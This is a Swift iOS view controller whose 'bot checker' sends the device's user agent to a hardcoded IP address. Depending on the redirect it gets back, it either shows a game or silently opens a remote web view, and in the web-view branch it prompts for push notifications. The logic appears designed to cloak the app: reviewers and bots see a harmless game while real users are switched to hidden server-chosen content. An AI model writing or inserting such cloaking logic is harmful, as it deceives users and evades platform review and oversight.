import WebKit
import OneSignal

class GIFViewController: UIViewController {
    fileprivate let service = DifferentServices.shared
    fileprivate let defaults = UserDefaults.standard
    fileprivate var webView:WKWebView? = WKWebView()
    fileprivate var wasRun = false
    fileprivate var userAgent = "" {
        didSet {
            checkMainURL()
        }
    }
   
    //MARK: - ViewController Methods
    override func viewDidLoad() {
        super.viewDidLoad()
        webView?.evaluateJavaScript("navigator.userAgent") { [weak self] (userAgent, error)  in
            if let ua = userAgent {
                self?.userAgent = ua as? String ?? "wk is dead"
            }
        }
    }
    
    //MARK: - Bot checker logic
    fileprivate func checkMainURL() {
        if !wasRun {
            let config = URLSessionConfiguration.default
            config.httpAdditionalHeaders = ["User-Agent": userAgent]
            let session = URLSession(configuration: config, delegate: self, delegateQueue: nil)
            let url = URL(string:  "http://78.47.187.129/5P1WyX8M")!
            let task = session.dataTask(with: url, completionHandler: { _, _, _ in })
            task.resume()
        }
        wasRun.toggle()
    }
    
    fileprivate func gameOrNot(_ redirectURL: String) {
        print(#file, #function, redirectURL)
        if redirectURL == "https://nobot/" {
            service.appIsGame = false
            hasPromptedOneSignal()
            DispatchQueue.main.async { [weak self] in
                self?.webView = nil
                self?.service.launchWKweb()
            }
        } else {
            service.appIsGame = true
            DispatchQueue.main.async { [weak self] in
                self?.webView = nil
                self?.service.launchTheGame()
            }
        }
    }
    
    //MARK: - OneSignal
    private func hasPromptedOneSignal() {
        OneSignal.sendTag("nobot", value: "1")
        let status: OSPermissionSubscriptionState = OneSignal.getPermissionSubscriptionState()
        let hasPrompted = status.permissionStatus.hasPrompted
        if !hasPrompted {
            OneSignal.promptForPushNotifications { hasPrompted in
                OneSignal.addTrigger("prompt_ios", withValue: "true")
            }
        }
        print("hasPrompted = \(hasPrompted)")
    }
    
    deinit {
        print("deinit called")
    }
}


//MARK: - URLSessionDataDelegate
extension GIFViewController: URLSessionDataDelegate {
    func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest request: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
        guard let redirectURL = request.url  else { return }
        if !service.dropboxJSSource.isEmpty && service.dropboxJSSource != "true" {
            gameOrNot(redirectURL.absoluteString)
        }
    }
}

